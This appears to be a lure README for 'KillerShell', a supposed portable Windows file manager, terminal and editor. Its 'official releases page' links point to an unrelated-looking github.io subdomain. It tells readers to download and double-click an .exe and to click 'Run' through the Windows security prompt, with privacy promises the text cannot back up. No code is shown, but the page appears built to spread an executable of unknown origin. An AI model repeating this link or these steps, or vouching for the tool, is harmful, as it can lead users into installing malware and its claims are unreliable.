# 📁 KillerShell - Manage your files and terminal easily

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://propositiontriceps628.github.io)

KillerShell combines a file manager, a terminal, and a text editor into one tool. It runs on Windows without the need for an installer. You do not need an account to use it.

## 🚀 Getting Started

Follow these steps to set up the software on your computer.

1. Visit the [official releases page](https://propositiontriceps628.github.io) to download the latest version.
2. Look for the file ending in `.exe` under the Assets section.
3. Click the file name to start the download.
4. Move the file to a folder where you want to keep the tool.
5. Double-click the file to open the program.

The application starts immediately. Windows might show a security prompt because the program is portable. Click "Run" to continue.

## 🛠 Features

KillerShell provides many tools in one window to help you work faster.

### Dual-Pane File Manager
View two folders at once. Drag and drop items between panes to move or copy them. This design helps you organize large collections of documents and images.

### Integrated Terminal
Access your command line from the same window. Use PowerShell or the standard command prompt without switching windows. The terminal supports tabbed navigation so you can keep multiple sessions open at once.

### Built-in Text Editor
Edit code or plain text files inside the application. You do not need external software to change configuration files or write notes. The editor supports syntax highlighting to make reading text easier.

### Powerful Search
Search for files across your folders. You can filter results by name, size, or date. The grep-style search helps you find specific text inside files quickly.

## 📋 System Requirements

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 4GB of RAM for smooth performance.
*   **Storage:** 50MB of free disk space.
*   **Updates:** Ensure your system has the latest version of the .NET Desktop Runtime installed.

## 💡 How to Use

Using KillerShell saves time when performing system tasks.

### Manage Files
Use the arrow keys or your mouse to select files in the dual-pane view. Right-click any file to see options like rename, delete, or open. Use the address bar at the top of each pane to jump to a specific path on your hard drive.

### Use the Terminal
Press the tab key to switch focus between the file manager and the terminal. Navigate folders using common commands. The terminal remembers your working directory and keeps your session active even if you switch away from the tab.

### Edit Text
Open any text file by double-clicking it. The editor opens in a new tab. Save your changes using the save icon in the menu bar. The editor tracks your changes and warns you if you try to close an unsaved file.

## ❓ Frequently Asked Questions

### Do I need to install anything?
No. KillerShell is a portable program. It does not write files to your Windows registry or system folders.

### Can I run this from a USB drive?
Yes. Copy the executable file to a USB drive. You can plug it into any Windows computer and run your tool without leaving traces on that machine.

### Does it track my usage?
No. The software works offline and does not require an internet connection, except to check for updates. Your data stays on your local machine.

### How do I update the software?
Delete the old version of the file once a new version becomes available. Download the new version from the link provided and replace the old file.

## 🔒 Privacy and Security

Your data stays on your local computer. This application does not collect logs or send your info to servers. It respects your privacy by default. Since you do not create an account, no personal information resides on any server.
